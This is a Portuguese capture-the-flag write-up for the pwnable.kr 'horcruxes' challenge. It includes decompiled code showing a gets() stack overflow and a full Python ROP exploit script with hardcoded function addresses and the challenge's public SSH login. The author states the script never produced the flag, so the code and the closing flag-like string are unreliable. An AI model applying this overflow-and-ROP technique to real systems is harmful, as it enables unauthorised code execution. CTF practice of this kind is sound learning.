
# Horcruxes
###### Solved by @Cubano2  
> Este é um CTF sobre [ROP]

## About the Challenge

Voldemort concealed his splitted soul inside 7 horcruxes.<br>
Find all horcruxes, and ROP it!<br>
author: jiwon choi<br>

## Solution  

A questão começa logando nesse ssh ```ssh horcruxes@pwnable.kr -p2222``` e dentro dele temos acesso a 2 arquivos:
```horcruxes``` e ```readme```.

Colocando no terminal ```cat readme``` podemos ler o arquivo, dentro dele contém essa mensagem:

``` 
horcruxes@pwnable:~$ cat readme 
connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege. rop it to read the flag.
```

Abri o executável no Ghidra e como na descrição da questão comenta sobre ROP vi uma função com o nome de ```ropme``` e fui averiguar ela.
```
undefined4 ropme(void)
 
{

  int iVar1;

  ssize_t sVar2;

  char local_78 [100];

  int local_14;

  int local_10;

  printf("Select Menu:");

  __isoc99_scanf(&DAT_080a0519,&local_14);

  getchar();

  if (local_14 == a) {

    A();

  }

  else if (local_14 == b) {

    B();

  }

  else if (local_14 == c) {

    C();

  }

  else if (local_14 == d) {

    D();

  }

  else if (local_14 == e) {

    E();

  }

  else if (local_14 == f) {

    F();

  }

  else if (local_14 == g) {

    G();

  }

  else {

    printf("How many EXP did you earned? : ");

    gets(local_78);

    iVar1 = atoi(local_78);

    if (iVar1 == sum) {

      local_10 = open("flag",0);

      sVar2 = read(local_10,local_78,100);

      local_78[sVar2] = '\0';

      puts(local_78);

      close(local_10);

                    /* WARNING: Subroutine does not return */

      exit(0);

    }

    puts("You\'d better get more experience to kill Voldemort");

  }

  return 0;

}

```

Podemos ver que essa função tem um ```if``` pra cada letra de `A` até `G`.
Procurando essas letras na aba de função no Ghidra temos um horcruxe pra cada letra, por exemplo:
```
void A(void)

{
  printf("You found \"Tom Riddle\'s Diary\" (EXP +%d)\n",a);
  return;
}
```

Mexendo mais um pouco no Ghidra achei uma função com o nome ```init_ABCDEFG```
```
void init_ABCDEFG(void)

{
  ssize_t sVar1;
  int iVar2;
  uint local_14;
  int local_10;
  
  local_10 = open("/dev/urandom",0);
  sVar1 = read(local_10,&local_14,4);
  if (sVar1 != 4) {
    puts("/dev/urandom error");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  close(local_10);
  srand(local_14);
  iVar2 = rand();
  a = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  b = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  c = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  d = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  e = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  f = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  g = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  sum = g + a + b + c + d + e + f;
  return;
```
Nessa função ```init_ABCDEFG``` não entendi muito seu proprosito, mas olhando com calma percebi que no final dela havia uma soma de todos os horcruxes no qual os valores de cada um eram definidos por ```/dev/urandom error```:
```sum = g + a + b + c + d + e + f;```

Acredito que se eu achar o endereço de todas as horcruxes, somar elas, e executar o Ropme de novo, possivelmente printaria a flag.

Como faremos isso?

Bom, no programa ao ele perguntar pra gente o quanto de xp nos acumulamos, no qual conseguimos ao acessar todas as funções, somando todos os EXPs de todos os horcruxes do Voldemort conseguimos a flag.
Para conseguirmos usaremos esse ```payload```:
```python3
#!/usr/bin/env python3
import paramiko
import time
from pwn import *

# Configuração da conexão SSH
host = "pwnable.kr"
port = 2222
username = "horcruxes"
password = "guest"

# Endereços das funções
func_A_addr = 0x0809FE4B
func_B_addr = 0x0809FE6A
func_C_addr = 0x0809FE89
func_D_addr = 0x0809FEA8
func_E_addr = 0x0809FEC7
func_F_addr = 0x0809FEE6
func_G_addr = 0x0809FF05

def ExtraExp(s):
    keyword1 = 'EXP +'
    keyword2 = 'EXP -'
    
    if keyword1 in s:
        start = s.find(keyword1) + len(keyword1)
    elif keyword2 in s:
        start = s.find(keyword2) + len(keyword2)
    else:
        return 0  # Retorna 0 se a linha não tiver EXP
    
    end = s.find(')', start)
    return int(s[start:end])


# Conectar via SSH
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(host, port, username, password)

# Abrir um shell interativo
ssh_shell = client.invoke_shell()
time.sleep(1)
ssh_shell.send("./horcruxes\n")
time.sleep(1)

# Ler a saída inicial
output = ssh_shell.recv(1024).decode()
print(output)

# Enviar opção "1" no menu
ssh_shell.send("1\n")
time.sleep(1)

output = ssh_shell.recv(1024).decode()
print(output)

# Enviar payload
payload = b'0' * 0x74 + b'\x00aaa' + p32(func_A_addr) + \
                               p32(func_B_addr) + \
                               p32(func_C_addr) + \
                               p32(func_D_addr) + \
                               p32(func_E_addr) + \
                               p32(func_F_addr) + \
                               p32(func_G_addr) + \
                               p32(0x0809FFFC)

ssh_shell.send(payload + b"\n")
time.sleep(1)

# Capturar saída das funções
output = ssh_shell.recv(2048).decode("latin1", errors="ignore")
print(output)

# Extrair os valores EXP
lines = output.split("\n")
A = ExtraExp(lines[1])
B = ExtraExp(lines[2])
C = ExtraExp(lines[3])
D = ExtraExp(lines[4])
E = ExtraExp(lines[5])
F = ExtraExp(lines[6])
G = ExtraExp(lines[7])

# Calcular soma
Sum = (A + B + C + D + E + F + G) % (2 ** 32)
if Sum > 0x7fffffff:
    Sum -= 2 ** 32
if Sum < 0x80000000 - 2 ** 32:
    Sum += 2 ** 32

# Enviar resposta final
ssh_shell.send("1\n")
time.sleep(1)

ssh_shell.send(f"{Sum}\n")
time.sleep(1)

# Capturar a saída final
output = ssh_shell.recv(1024).decode()
print(output)

# Fechar conexão
client.close()
```

Nesse código eu cheguei muito perto de concluir o exercício, ele até conseguia fazer a soma de todos os números e voltar pra função ```ROPme()``` porém no próprio código ele printava as vezes um número grande e na frente desse número aparecia +-. Ele ficava desse jeito no seguinte exemplo ```+-921902179319921```. Até tentei consertar o código mas a cada alteração que fazia mais distante da flag eu ficava e o código ficava quebrado ou compilava o ```horcruxes``` errado.
Porém não consegui fazer as alterações a tempo no dia 28/02/25 e no dia seguinte dia 01/03/25 o site desse exercício começou a mudar de servidor, e eu acabei não conseguindo completar a questão. Mas dando uma mexida o código é certo que consigo resolver.


>`[Magic_spell_ls_4vad4_K3draV4]`

